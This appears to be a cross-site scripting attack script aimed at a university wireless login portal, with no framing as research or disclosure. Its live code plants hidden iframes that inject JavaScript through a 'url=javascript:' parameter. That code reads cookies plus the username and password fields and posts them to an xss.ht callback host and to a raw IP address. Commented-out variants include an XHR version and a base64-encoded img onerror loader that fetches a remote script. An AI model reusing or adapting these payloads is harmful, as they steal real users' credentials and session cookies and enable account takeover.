// function my_collect_page_data( path ) {
//     try {
//         var full_url = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(document.cookie)"
//         var xhr = new XMLHttpRequest();
//         xhr.onreadystatechange = function() {
//             if (xhr.readyState == XMLHttpRequest.DONE) {
//                 page_data = {
//                     "page_html": xhr.responseText,
//                     "uri": full_url
//                 }
//                 send_collected_page( page_data );
//             }
//         }
//         xhr.open('GET', full_url, true);
//         xhr.send(null);
//     } catch ( e ) {
//     }
// }

// for( var i = 0; i < collect_page_list.length; i++ ) {
//     // Make sure the path is correctly formatted
//     // if( collect_page_list[i].charAt(0) != "/" ) {
//     //     collect_page_list[i] = "/" + collect_page_list[i];
//     // }
//     my_collect_page_data( collect_page_list[i] );
// }

// try {
//     // var full_url = "//" + document.domain + ":8081" + "/admin.php"
//     var full_url = "net.tsinghua.edu.cn/wireless/?url=javascript:(document.cookie)"
//     var xhr = new XMLHttpRequest();
//     xhr.onreadystatechange = function() {
//         if (xhr.readyState == XMLHttpRequest.DONE) {
//             page_data = {
//                 "page_html": xhr.responseText,
//                 "uri": full_url
//             }
//             send_collected_page( page_data );
//         }
//     }
//     xhr.open('GET', full_url, true);
//     xhr.send(null);
// } catch ( e ) {
// }


var ele = document.createElement('IFRAME')
ele.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(setTimeout(()=>{cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt}))},1000))"
ele.style = "display: none"
document.children[0].appendChild(ele)

var ele2 = document.createElement('IFRAME')
ele2.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(setTimeout(()=>{cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', '166.111.68.92/save', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt}))},1000))"
ele2.style = "display: none"
document.children[0].appendChild(ele2)

// <iframe src="http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass})))" style="display: none"/>

// </textarea><img style="display:none" src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaWdvb2R2ZWdldGFibGUueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>